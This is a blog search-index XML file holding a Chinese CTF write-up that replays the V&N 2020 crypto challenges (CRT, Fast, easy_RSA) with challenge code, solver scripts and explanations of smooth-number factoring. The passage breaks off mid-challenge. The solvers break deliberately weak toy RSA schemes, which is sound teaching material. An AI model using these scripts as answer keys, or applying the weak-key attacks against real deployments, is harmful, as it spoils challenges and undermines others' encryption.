<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>20200219 V&amp;N2020公开赛Crypto方向复现</title>
    <url>/posts/19a278ea/</url>
    <content><![CDATA[<blockquote>
<p>前景提要</p>
</blockquote>
<p>在签到2021TCTF时看到一篇WP，是标题所述比赛的easy_RSA，本来只是用一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python2 -m primefac -vs -m=p+<span class="number">1</span> XXXXX</span><br></pre></td></tr></table></figure>

<p>尝试分解那个迷之模数，当然以失败告终，但是在尚师傅的指导下，sage和ubuntu子系统觉醒出了更强大的组合</p>
<p>然后从这篇WP出发，尝试和组里的师傅们复现下这场比赛的Crypto部分</p>
<span id="more"></span>

<h1 id="20200219-V-amp-N2020公开赛Crypto方向复现"><a href="#20200219-V-amp-N2020公开赛Crypto方向复现" class="headerlink" title="20200219 V&amp;N2020公开赛Crypto方向复现"></a>20200219 V&amp;N2020公开赛Crypto方向复现</h1><h3 id="CRT"><a href="#CRT" class="headerlink" title="CRT"></a>CRT</h3><blockquote>
<p>题目描述</p>
</blockquote>
<p>Do you know the Chinese Remainder Theorem sometimes may not only have one solution?</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ms = [getRandomNBitInteger(<span class="number">128</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)]</span><br><span class="line">p = reduce(<span class="keyword">lambda</span> x, y: x*y, ms)</span><br><span class="line">x = getRandomRange(<span class="number">1</span>, p)</span><br><span class="line">cs = [x % m <span class="keyword">for</span> m <span class="keyword">in</span> ms]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;flag&#123;&quot;</span> + hashlib.sha256(<span class="built_in">str</span>(x).encode()).hexdigest() + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line"><span class="keyword">assert</span>(<span class="string">&quot;4b93deeb&quot;</span> <span class="keyword">in</span> flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ms = [284461942441737992421992210219060544764, 218436209063777179204189567410606431578, 288673438109933649911276214358963643204, 239232622368515797881077917549177081575, 206264514127207567149705234795160750411, 338915547568169045185589241329271490503, 246545359356590592172327146579550739141, 219686182542160835171493232381209438048]</span></span><br><span class="line"><span class="comment"># cs = [273520784183505348818648859874365852523, 128223029008039086716133583343107528289, 5111091025406771271167772696866083419, 33462335595116820423587878784664448439, 145377705960376589843356778052388633917, 128158421725856807614557926615949143594, 230664008267846531848877293149791626711, 94549019966480959688919233343793910003]</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>解题思路</p>
</blockquote>
<p>题目很简单，但是自己饶了好多弯</p>
<p>首先，一看，这不就是构造了8个同余式吗，直接CRT一把梭；结果不对</p>
<p>然后我瞟了一眼网上的WP，看到不互素后就匆匆折返。确实忘了，中国剩余定理使用的条件是模数不互素，显然ms里的数肯定存在着相同的公因子；于是我在sage中分解了这8个数（这里写脚本我是用网上找来的CRT函数的，它会检查模数是否是互质，但其实sage里帮你自动处理了）</p>
<p><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210705194105634.png" alt="image-20210705194105634"></p>
<p>然后在保证模数尽可能大的原则下，写完了脚本。但结果依旧不对，并且出来的x是1006位，由题目可知x是属于$[1, 2^{1024}]$的，所以显然x是落在了$[2^{1007},2^{1024}]$这段区间。总之模数不够</p>
<p>不过，这也不是最困扰我的地方，与题目提示不同，我第一个想到的是，扩大模数，构造如下的同余方程<br>$$<br>\begin{cases}<br>x\equiv cs_1\ (mod\ ms_1)\\<br>x\equiv cs_2\ (mod\ ms_2)\\<br>\vdots\qquad \vdots \qquad\qquad \vdots\\<br>x\equiv cs_8\ (mod\ ms_8)\\<br>x\equiv cs_9\ (mod\ ms_9)<br>\end{cases}<br>$$<br>其中ms9是一个随机20位的素数，因为1007+20差不多就可以达到1024的大小</p>
<blockquote>
<p>编写脚本</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> copy</span><br><span class="line"></span><br><span class="line">ms = [<span class="number">284461942441737992421992210219060544764</span>, <span class="number">218436209063777179204189567410606431578</span>, <span class="number">288673438109933649911276214358963643204</span>, <span class="number">239232622368515797881077917549177081575</span>, <span class="number">206264514127207567149705234795160750411</span>, <span class="number">338915547568169045185589241329271490503</span>, <span class="number">246545359356590592172327146579550739141</span>, <span class="number">219686182542160835171493232381209438048</span>]</span><br><span class="line">cs = [<span class="number">273520784183505348818648859874365852523</span>, <span class="number">128223029008039086716133583343107528289</span>, <span class="number">5111091025406771271167772696866083419</span>, <span class="number">33462335595116820423587878784664448439</span>, <span class="number">145377705960376589843356778052388633917</span>, <span class="number">128158421725856807614557926615949143594</span>, <span class="number">230664008267846531848877293149791626711</span>, <span class="number">94549019966480959688919233343793910003</span>]</span><br><span class="line"></span><br><span class="line">new_ms = copy.deepcopy(ms)</span><br><span class="line">my_ms = getPrime(<span class="number">20</span>)</span><br><span class="line">new_ms.append(my_ms)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(my_ms):</span><br><span class="line">    new_cs = copy.deepcopy(cs)</span><br><span class="line">    new_cs.append(i)</span><br><span class="line">    x = crt(new_cs, new_ms)</span><br><span class="line">    flag = <span class="string">&quot;flag&#123;&quot;</span> + hashlib.sha256(<span class="built_in">str</span>(x).encode()).hexdigest() + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;4b93deeb&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>再在该文件位置打开cmd，进入子系统，打开sage，输入</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">load(&quot;脚本文件名&quot;)</span><br></pre></td></tr></table></figure>

<p><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210705200158602.png" alt="image-20210705200158602"></p>
<p>就直接出来了，省去了粘贴换行的一些琐碎</p>
<p><strong>还有一点需要注意，在做这道题时最困扰我的是：浅拷贝。显然上面的脚本中，你可以看到我用了深拷贝的库，因为如果换成=赋值语句，你会印象深刻；除了debug意识淡薄了，也一度怀疑是不是自己对CRT还有理解偏差的地方</strong></p>
<blockquote>
<p>其他师傅的思路</p>
</blockquote>
<p>虽然这样做也无可厚非，但是还是没有能精确get到出题人的意思；什么时候才能像尚师傅一样做出题人肚子里的小蛔虫啊（茶）</p>
<p>最直接的思路应该是，CRT解出来的其实蕴含了一系列的解，其通式可以写成<br>$$<br>{kM+\sum_{i=1}^na_it_iM_i;\ k\in\mathbb{Z} }<br>$$<br>所以只要用CRT解出来x，然后爆破k就好，因为确实比较接近，上下两种方法的复杂度是同一级别的</p>
<p>当然上述通式的M是不互素的模数的积，贴一下脚本，不愧是尚师傅</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"></span><br><span class="line">ms = [<span class="number">284461942441737992421992210219060544764</span>, <span class="number">218436209063777179204189567410606431578</span>, <span class="number">288673438109933649911276214358963643204</span>, <span class="number">239232622368515797881077917549177081575</span>, <span class="number">206264514127207567149705234795160750411</span>, <span class="number">338915547568169045185589241329271490503</span>, <span class="number">246545359356590592172327146579550739141</span>, <span class="number">219686182542160835171493232381209438048</span>]</span><br><span class="line">cs = [<span class="number">273520784183505348818648859874365852523</span>, <span class="number">128223029008039086716133583343107528289</span>, <span class="number">5111091025406771271167772696866083419</span>, <span class="number">33462335595116820423587878784664448439</span>, <span class="number">145377705960376589843356778052388633917</span>, <span class="number">128158421725856807614557926615949143594</span>, <span class="number">230664008267846531848877293149791626711</span>, <span class="number">94549019966480959688919233343793910003</span>]</span><br><span class="line">p = reduce(<span class="keyword">lambda</span> xx, yy: lcm(xx, yy), ms)</span><br><span class="line"></span><br><span class="line">x = crt(cs, ms)</span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    xx = k*p + x</span><br><span class="line">    k += <span class="number">1</span></span><br><span class="line">    flag = <span class="string">&quot;flag&#123;&quot;</span> + hashlib.sha256(<span class="built_in">str</span>(xx).encode()).hexdigest() + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;4b93deeb&quot;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h3 id="Fast"><a href="#Fast" class="headerlink" title="Fast"></a>Fast</h3><blockquote>
<p>题目描述</p>
</blockquote>
<p>This is a modified RSA scheme that once proposed at a cryptography conference to achieve faster decryption. But, there seems something wrong with it.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">N = p * q</span><br><span class="line"></span><br><span class="line">g, r1, r2 = [getRandomRange(<span class="number">1</span>, N) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">g1 = <span class="built_in">pow</span>(g, r1 * (p-<span class="number">1</span>), N)</span><br><span class="line">g2 = <span class="built_in">pow</span>(g, r2 * (q-<span class="number">1</span>), N)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">m</span>):</span></span><br><span class="line">    s1, s2 = [getRandomRange(<span class="number">1</span>, N) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br><span class="line">    c1 = (m * <span class="built_in">pow</span>(g1, s1, N)) % N</span><br><span class="line">    c2 = (m * <span class="built_in">pow</span>(g2, s2, N)) % N</span><br><span class="line">    <span class="keyword">return</span> (c1, c2)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">c1, c2</span>):</span></span><br><span class="line">    xp = c1 % p</span><br><span class="line">    xq = c2 % q</span><br><span class="line">    <span class="comment"># Chinese Remainder Theorem</span></span><br><span class="line">    m = (xp*inverse(q, p)*q + xq*inverse(p, q)*p) % N</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c = encrypt(bytes_to_long(flag))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># N = 18680643069610062851842282268594530254220611012409807422663284548187050713427682950720783343430650669361838067625768840896513125210105582070603021732086193955893838077699465426052925750736212977005683541174195320832791835197114668838654054444342903298662698415765898335350206380896849522280206304272801325820946987172164086644949521111058774180676742851681476123338557138770304164634321305204827406522957769478330124484710532963132900017800651579612646041955628867746525508376194147796920773364680264059390497210260540079810501777507814448518995581208169818764701641258963569599247156932381367802991222265241699715283</span></span><br><span class="line"><span class="comment"># g1 = 9143176283300810019842153344177123108612540016879643936458724056602746667157014763960725115919119704406826965726023263657276550779443988565368344040505696950820899770544814163379169539926317676679421275092688200844094929042154854719312788471536324082041360841253720783220459009201882865091829118575721525038404689868986360373373122049951274015083845966946475469982961355934516388706446794517870569063777231434618411404965077775991870069073539415961610645268985004687402050059891500490949250730689691141954694508001895390336750734542724392709744200091587065816283592253967715080611459937165344139809223328071517060208</span></span><br><span class="line"><span class="comment"># g2 = 14068322834597276347776814624877614869834816383564391664570268934537693322688875343215293618493363798985047779057952636529313879548457643220996398640913517182122425631198219387988691569709691279442005545716133131472147592456812502863851227108284027033557263611949365667779259585770738623603814004666845554284808166195201470503432803440754207350347128045893594280079379926676477680556845095378093693409219131090910168117334308781843178748431526974047817218228075136005979538773141427004682344298827618677773735288946271346252828348742296301538573408254015281232250841148556304927266143397565889649305095857756884049430</span></span><br><span class="line"><span class="comment"># c1, c2 = (3976514029543484086411168675941075541422870678409709261442618832911574665848843566949154289825219682094719766762966082440586568781997199077781276145091509192208487682443007457513002005089654365915817414921574344557570444253187757317116858499013550050579856269915915792827620535138057468531410166908365364129001407147467636145589396570815405571923148902993581000542566387654639930651683044853608873583911638108204074537952317056718986683846742909366072461130053275195290631718363272923316002049685111871888148244026652658482359335651889139243735138819453744763293112267738369048641158946411500606588429007794613880534, 18524535479582837341745231233387403662294605513261199630593257391163433751052467785080620993007681605662927226603747560698627838567782891522546977611597418150309028806158429831471152782211111046118637630899456903846057977815397285171313888516791822545633820066408276065732715348834255021260666966934592884548856831383262013360819013814149529393178712576141627031723067564594282618223686778534522328204603249125537258294561872667849498796757523663858312311082034700705599706428944071848443463999351872482644584735305157234751806369172212650596041534643187402820399145288902719434158798638116870325144146218568810928344)</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>解题思路</p>
</blockquote>
<p>这是什么神仙题，n可以被分解，解密函数也是现成的，而且是正确的</p>
<p>应该是出题人有意为之吧</p>
<blockquote>
<p>编写脚本</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">c1, c2</span>):</span></span><br><span class="line">    xp = c1 % p</span><br><span class="line">    xq = c2 % q</span><br><span class="line">    <span class="comment"># Chinese Remainder Theorem</span></span><br><span class="line">    m = (xp*inverse(q, p)*q + xq*inverse(p, q)*p) % N</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">N = <span class="number">18680643069610062851842282268594530254220611012409807422663284548187050713427682950720783343430650669361838067625768840896513125210105582070603021732086193955893838077699465426052925750736212977005683541174195320832791835197114668838654054444342903298662698415765898335350206380896849522280206304272801325820946987172164086644949521111058774180676742851681476123338557138770304164634321305204827406522957769478330124484710532963132900017800651579612646041955628867746525508376194147796920773364680264059390497210260540079810501777507814448518995581208169818764701641258963569599247156932381367802991222265241699715283</span></span><br><span class="line">p = <span class="number">106417460801952098564106499070151038873024911455536068339939244771790540941720274028587207976808157868694798197258813111268537142798255715538795631061310640662123200632946626357221258957037900275496387833531601196435353735799649271157394995634449593246448856875377066127076028119584523015225013672972959211463</span></span><br><span class="line">q = <span class="number">175541146432497750706994831036579922743699110188170130349078711914372625934257198871368005366941949929286673808928975466227805723983786985788458460399280363091838402146937391317438052439989533790389951909401937742849194965413829547962616241584178560041639076246949503118700746929605640733813016659832730773141</span></span><br><span class="line">g1 = <span class="number">9143176283300810019842153344177123108612540016879643936458724056602746667157014763960725115919119704406826965726023263657276550779443988565368344040505696950820899770544814163379169539926317676679421275092688200844094929042154854719312788471536324082041360841253720783220459009201882865091829118575721525038404689868986360373373122049951274015083845966946475469982961355934516388706446794517870569063777231434618411404965077775991870069073539415961610645268985004687402050059891500490949250730689691141954694508001895390336750734542724392709744200091587065816283592253967715080611459937165344139809223328071517060208</span></span><br><span class="line">g2 = <span class="number">14068322834597276347776814624877614869834816383564391664570268934537693322688875343215293618493363798985047779057952636529313879548457643220996398640913517182122425631198219387988691569709691279442005545716133131472147592456812502863851227108284027033557263611949365667779259585770738623603814004666845554284808166195201470503432803440754207350347128045893594280079379926676477680556845095378093693409219131090910168117334308781843178748431526974047817218228075136005979538773141427004682344298827618677773735288946271346252828348742296301538573408254015281232250841148556304927266143397565889649305095857756884049430</span></span><br><span class="line">c1, c2 = (<span class="number">11823197525493679922462229312577565795790231943088967365041996969833687685138684663425736403362435947961162359880274061507909130337620672558788978473833973219147915805313662825413066312702383051828013250123487196306204170199886569869489424725349908927607008718147223533469811907589117819645863932215575433971043477313368023151369535540404625770972404614353104003800218866798610393931587791320241316614291168862653357565646094135540152539864650862797163818826669760914933822102864027625653527726320652797672561838261305835579141720874114224470663547248330428718333156518891792470511397032487663666074601934673538205109</span>, <span class="number">2779880537115408257595446644781256096238766529002829447374722026519904649762403856519534823378460053135911559335526959970225428282722454848749344880298922526768059646336181280198446021828944801139755808467391788638452557321859820238241700901109441893986616102072462317079424252804407738823379369895077334731847147033163210247117705503923134257895313179139530926252976334117657503240153146324063219900284664702824599298036943536916560758754916817002800088718757733395590409870811657828057225054151582638807129324477142895521653053887499550733193273834240174306480447726764751838123539992748222035712739618864572963930</span>)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(decrypt(c1, c2)))</span><br></pre></td></tr></table></figure>

<p>应该是出题人有意为之的，但何必呢</p>
<h4 id="加密解密原理"><a href="#加密解密原理" class="headerlink" title="加密解密原理"></a>加密解密原理</h4><p>在做的过程中，有一点令我感到疑惑，一开始看到解密函数时，我认为这并不是针对加密函数的；也就是说，我以为的考点是让我们自己实现解密函数的</p>
<blockquote>
<p>生成随机数</p>
</blockquote>
<p>生成p，q，g1，g2，（g，r1，r2$\in$[1, N]）<br>$$<br>\begin{align}<br>g_1=g^{r_1\times(p-1)}\ mod\ N\\<br>g_2=g^{r_2\times(q-1)}\ mod\ N<br>\end{align}<br>$$</p>
<blockquote>
<p>加密</p>
</blockquote>
<p>加密后的结果是c1，c2，（s1，s2$\in$[1, N]）<br>$$<br>\begin{align}<br>c_1=m\times g_1^{s_1}\ mod\ N\\<br>c_2=m\times g_2^{s_2}\ mod\ N<br>\end{align}<br>$$</p>
<blockquote>
<p>解密</p>
</blockquote>
<p>看他的样子是解以下这个同余方程组<br>$$<br>\begin{align}<br>m\equiv c_1\ (mod\ p)\\<br>m\equiv c_2\ (mod\ q)<br>\end{align}<br>$$<br>顺便再来回顾以下CRT的通式，直接抄维基百科上的了</p>
<p><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210706144819994.png" alt="image-20210706144819994"></p>
<p>但问题是m和c满足这个同余方程组吗？就像是ElGamal一样，他乘了一个数，不应该乘以其的逆元吗？</p>
<p>然后尚师傅点醒我了，由$g_1=g^{r_1\times(p-1)}\ mod\ N$可知，<br>$$<br>g_1\equiv g^{r_1\times (p-1)}\equiv 1\ (mod\ p)<br>$$<br>这就是欧拉定理</p>
<p><img src="https://i.imgur.com/KftFFd3.gif" alt="欧拉"></p>
<p>所以在模p和模q时，那个加密时多乘的数就变成1了</p>
<p><strong>总之，回到题目，说是一种修改过的RSA加密模式；当然在课上也学过用CRT加速RSA的解密，前提是要知道p和q，和这个异曲同工吧。或者应该说，这种方法有点借鉴了ElGamal加密算法的思想</strong></p>
<h3 id="easy-RSA"><a href="#easy-RSA" class="headerlink" title="easy_RSA"></a>easy_RSA</h3><blockquote>
<p>题目描述</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getprime</span>(<span class="params">bits</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        n = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> n.bit_length() &lt; bits:</span><br><span class="line">            n *= next_prime(randint(<span class="number">1</span>,<span class="number">1000</span>))</span><br><span class="line">        <span class="keyword">if</span> isPrime(n - <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> n - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">m = bytes_to_long(<span class="string">b&#x27;flag&#123;************************************&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = getprime(<span class="number">505</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">r = getPrime(<span class="number">512</span>)</span><br><span class="line"><span class="keyword">assert</span> m &lt; q</span><br><span class="line"></span><br><span class="line">n = p * q * r</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">d = invert(q ** <span class="number">2</span>, p ** <span class="number">2</span>)</span><br><span class="line">c = <span class="built_in">pow</span>(m, <span class="number">2</span>, r)</span><br><span class="line">cipher = <span class="built_in">pow</span>(c, e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"><span class="built_in">print</span>(cipher)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">7941371739956577280160664419383740967516918938781306610817149744988379280561359039016508679365806108722198157199058807892703837558280678711420411242914059658055366348123106473335186505617418956630780649894945233345985279471106888635177256011468979083320605103256178446993230320443790240285158260236926519042413378204298514714890725325831769281505530787739922007367026883959544239568886349070557272869042275528961483412544495589811933856131557221673534170105409</span></span><br><span class="line"><span class="string">7515987842794170949444517202158067021118454558360145030399453487603693522695746732547224100845570119375977629070702308991221388721952258969752305904378724402002545947182529859604584400048983091861594720299791743887521228492714135449584003054386457751933095902983841246048952155097668245322664318518861440</span></span><br><span class="line"><span class="string">1618155233923718966393124032999431934705026408748451436388483012584983753140040289666712916510617403356206112730613485227084128314043665913357106301736817062412927135716281544348612150328867226515184078966397180771624148797528036548243343316501503364783092550480439749404301122277056732857399413805293899249313045684662146333448668209567898831091274930053147799756622844119463942087160062353526056879436998061803187343431081504474584816590199768034450005448200</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>解题思路</p>
</blockquote>
<p>终于来了</p>
<p>先看三个素数，这里出题人狡诈，p是用题目中的getprime函数得出来的，q和r则是用Crypto库中的getPrime得到的</p>
<p>所以看函数就知道，p+1可以很好地得到分解</p>
<p>我们求解的步奏一步步反推回去应该是这样</p>
<img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210706161649767.png" alt="image-20210706161649767"/>

<p>必须知道p和q，然后求出r</p>
<p>好吧，不会了，用之前看到的分解去试试</p>
<p>竟然！被同样的招式打败了。应该也是出题人使然</p>
<p><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210706162410515.png" alt="image-20210706162410515"></p>
<p>但p确实满足上述性质</p>
<p><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210706162852340.png" alt="image-20210706162852340"></p>
<p>那就先按照上面的流程写脚本吧</p>
<p>在最后一个箭头处，由于算来的c是512位的，所以不能对c进行直接开方；那么rabin攻击呢，模数是一个质数；终于，被老师催更无数，<strong>平方根算法</strong>登场，网上看到的一些jo本大多都是基于这个算法的实现的</p>
<blockquote>
<p>脚本编写</p>
</blockquote>
<p>emmmmm时间来不及了，先用下库函数了，后续再补充，老师等我</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy.ntheory.residue_ntheory <span class="keyword">import</span> nthroot_mod</span><br><span class="line"></span><br><span class="line">n = <span class="number">7941371739956577280160664419383740967516918938781306610817149744988379280561359039016508679365806108722198157199058807892703837558280678711420411242914059658055366348123106473335186505617418956630780649894945233345985279471106888635177256011468979083320605103256178446993230320443790240285158260236926519042413378204298514714890725325831769281505530787739922007367026883959544239568886349070557272869042275528961483412544495589811933856131557221673534170105409</span></span><br><span class="line">d = <span class="number">7515987842794170949444517202158067021118454558360145030399453487603693522695746732547224100845570119375977629070702308991221388721952258969752305904378724402002545947182529859604584400048983091861594720299791743887521228492714135449584003054386457751933095902983841246048952155097668245322664318518861440</span></span><br><span class="line">cipher = <span class="number">1618155233923718966393124032999431934705026408748451436388483012584983753140040289666712916510617403356206112730613485227084128314043665913357106301736817062412927135716281544348612150328867226515184078966397180771624148797528036548243343316501503364783092550480439749404301122277056732857399413805293899249313045684662146333448668209567898831091274930053147799756622844119463942087160062353526056879436998061803187343431081504474584816590199768034450005448200</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">p = <span class="number">102634610559478918970860957918259981057327949366949344137104804864768237961662136189827166317524151288799657758536256924609797810164397005081733039415393</span></span><br><span class="line">q = <span class="number">7534810196420932552168708937019691994681052660068275906973480617604535381306041583841106383688654426129050931519275383386503174076258645141589911492908993</span></span><br><span class="line">r = <span class="number">10269028767754306217563721664976261924407940883784193817786660413744866184645984238866463711873380072803747092361041245422348883639933712733051005791543841</span></span><br><span class="line"><span class="keyword">assert</span> d == invert(q**<span class="number">2</span>, p**<span class="number">2</span>)</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)*(r-<span class="number">1</span>)</span><br><span class="line">d = invert(e, phi)</span><br><span class="line">c = <span class="built_in">pow</span>(cipher, d, n)</span><br><span class="line"><span class="comment"># print(c.bit_length())</span></span><br><span class="line"><span class="comment"># 512</span></span><br><span class="line"><span class="comment"># print(c)</span></span><br><span class="line"><span class="comment"># c = 8081092455112516397361105816900490085355315574087538340788309885334106796325593823678787887569920404814986643819898763828872716522338864714182757065213683</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(nthroot_mod(c, <span class="number">2</span>, r)))</span><br></pre></td></tr></table></figure>

<h4 id="光滑数"><a href="#光滑数" class="headerlink" title="光滑数"></a>光滑数</h4><p>之前就想整理Crypto中关于光滑数的考点</p>
<p>所谓光滑数就是：<strong>是一个可以因数分解为小素数乘积的正整数</strong></p>
<p>然后有两个算法可以分解，一是这道题讲的<a href="https://en.wikipedia.org/wiki/Williams'_p_%2B_1_algorithm">Williams’p+1 algorithm</a>，还有一种是解减一是光滑数的<a href="https://en.wikipedia.org/wiki/Pollard%27s_p_%E2%88%92_1_algorithm">Pollard’s p−1 algorithm</a>，可以使用这个python的包来解</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -m primefac -vs -m=p-1 XXXXX</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -m primefac -vs -m=+1 XXXXXX</span><br></pre></td></tr></table></figure>

<p>来道题</p>
<blockquote>
<p>题目描述</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choice</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> isPrime, sieve_base <span class="keyword">as</span> primes</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">myPrime</span>(<span class="params">bits</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        n = <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> n.bit_length() &lt; bits:</span><br><span class="line">            n *= choice(primes)</span><br><span class="line">        <span class="keyword">if</span> isPrime(n + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> n + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">m = <span class="built_in">int</span>.from_bytes(flag.encode(), <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">p = myPrime(<span class="number">2048</span>)</span><br><span class="line">q = getPrime(<span class="number">2048</span>)</span><br><span class="line">n = p * q</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># n = 1224542620373200232525165378018470774334801515191193204875465445916504222883935188890019876845076388385357911730689547124547346252951158814249284724565588433721828377715469374541007756509231399263095022024229078845538543233785364809917406108015271780070196140628158427541531563472532516237632553353655535922926443707617182025475004547531104052989085765070550150028833424395972178427807901747932614235844448614858629761183210600428438018388051958214596857405813088470933109693499438012040822262549119751099008671892966082341548512112435591881692782766559736840448702039918465573051130405935280702181505538733234675792472428666968900055706926735800561218167237812066851519973807203332801575980055838563085817664973968944323258406789203078387708964307931318918136664885818917720073433998810127482159223895026085726623747340692196977140382318293090736558135980651252533606603312148824142669800602887109353065489282386215179238458743567166284295855288783740314247952124965482197632971993708775190564519250754150756867653033527903848903210074426177258586450311109023467944412194124015505951966140443860862968311560843608415723549525497729679097936310538451467530605937684408079363677707513923579164067808729408365886209340192468399685190639</span></span><br><span class="line"><span class="comment"># c = 